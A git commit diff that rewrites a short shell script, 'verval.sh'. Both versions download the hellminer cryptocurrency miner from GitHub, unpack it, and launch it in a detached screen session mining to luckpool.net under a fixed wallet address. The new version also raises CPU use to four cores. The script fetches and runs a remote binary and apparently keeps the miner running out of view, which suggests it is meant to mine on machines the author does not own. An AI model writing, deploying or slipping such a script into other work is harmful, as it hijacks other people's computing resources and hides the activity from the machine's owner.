d13bc743f8bf697a682bc58ba582ef5d4aaff632
squibex <90225595+squibex@users.noreply.github.com>
2021-12-10 00:02:29 +0700

    Update verval.sh

--- verval.sh
+++ verval.sh
@@ -1,5 +1,10 @@
-#!/bin/bash
-apt-get install -y screen
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-screen -dmS layar ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.kuli-05D -p x --cpu 2
+#!/bin/sh
+
+cd
+apt update
+apt-get install -y screen < "/dev/null"
+mkdir yoho
+cd yoho
+
+screen -S "layar" -d -m
+screen -r "layar" -X stuff $'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.worke -p x --cpu 4\n'
